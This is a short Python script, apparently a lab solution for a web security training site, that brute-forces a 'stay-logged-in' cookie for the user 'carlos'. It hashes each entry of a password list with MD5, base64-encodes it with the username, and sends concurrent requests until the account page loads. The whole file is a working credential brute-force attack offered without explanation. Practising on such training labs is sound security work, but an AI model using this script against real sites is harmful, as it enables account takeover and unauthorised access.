import base64
import aiohttp
import asyncio
import hashlib

url = 'https://ac1e1f481e8db503c013576c0092008a.web-security-academy.net/my-account'
session_token = '2jy2iJw48q35awT4brBnI3rFIPRci3qc'

target_user = 'carlos'

async def test_password(password):
    h = hashlib.md5(password.encode()).hexdigest()
    token = base64.b64encode(f"{target_user}:{h}".encode())
    token = token.decode()

    cookies = {'session': session_token, 'stay-logged-in': token}
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.get(url=url) as resp:
            text = await resp.text()
            return (token, 'Your username is' in text)

async def main():
    tasks = []
    with open('passwords.txt', 'r') as f:
        for password in f.readlines():
            tasks.append(asyncio.ensure_future(test_password(password.strip()))) 

    res = await asyncio.gather(*tasks)
    for token, valid in res:
        if valid:
            print(f"Found token {token}")

asyncio.run(main())
